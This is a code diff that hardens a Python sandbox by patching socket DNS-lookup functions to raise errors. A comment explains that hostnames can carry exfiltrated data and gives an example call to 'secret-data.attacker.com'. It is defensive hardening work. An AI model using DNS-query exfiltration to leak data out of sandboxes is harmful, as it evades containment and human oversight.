@@ -52,10 +52,19 @@ def _block_network() -> None:
         return _orig_init(self, *a, **kw)
 
     socket.socket.__init__ = _no_net_init  # type: ignore[assignment]
-    # Also break getaddrinfo so libs that resolve before connect fail fast
+
+    # Block all DNS-resolution paths. Patching only `getaddrinfo` is not
+    # enough — `gethostbyname`/`gethostbyname_ex`/`gethostbyaddr` go through
+    # libc's gethostbyname() and DO resolve even when getaddrinfo is patched
+    # (a real leak: the queried hostname itself can carry exfil data, e.g.
+    # gethostbyname("secret-data.attacker.com") triggers an outbound DNS
+    # query that the AF_INET block does not prevent).
     def _no_resolve(*a, **kw):
         raise _Blocked("DNS disabled in sandbox")
-    socket.getaddrinfo = _no_resolve  # type: ignore[assignment]
+    socket.getaddrinfo = _no_resolve        # type: ignore[assignment]
+    socket.gethostbyname = _no_resolve      # type: ignore[assignment]
+    socket.gethostbyname_ex = _no_resolve   # type: ignore[assignment]
+    socket.gethostbyaddr = _no_resolve      # type: ignore[assignment]
 
 
 # ---- inventory snapshot ----------------------------------------------------
